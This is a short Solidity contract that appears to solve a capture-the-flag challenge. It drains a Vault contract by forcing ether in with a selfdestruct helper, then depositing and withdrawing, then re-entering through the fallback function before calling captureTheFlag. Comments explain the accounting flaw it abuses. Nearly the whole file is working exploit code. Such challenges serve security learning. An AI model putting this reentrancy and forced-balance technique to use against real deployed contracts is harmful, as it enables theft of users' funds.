// SPDX-License-Identifier: NONE
pragma solidity 0.8.12;

import "./Vault.sol";
import "./KillMe.sol";

contract MineNow {
    Vault vault;
    bool enter;

    constructor(Vault _vault) {
        vault = _vault;
    }

    fallback() external payable {
        if (enter) {
            return;
        }
        enter = true;
        vault.withdraw(0, address(this), address(this));       
    }

    // In _withdraw() it sets uint256 excessETH = totalAssets() - totalSupply(); when you look at what totalAssets() does it returns address(this).balance
    // SO you pretty much have to force ether into the contract with selfdestruct(), call deposit(), then withraw() and finally reenter for that last eth
    function stealFrFr(uint256 deposit, uint256 forceIn) external payable {
        require(msg.value == deposit + forceIn);

        new KillMe{ value: forceIn }(payable(address(vault)));

        vault.deposit{ value: deposit }(deposit, address(this));
        vault.withdraw(deposit, address(this), address(this));       
        vault.captureTheFlag(msg.sender);

        payable(msg.sender).call{ value: address(this).balance, gas: 5000};
    }
}
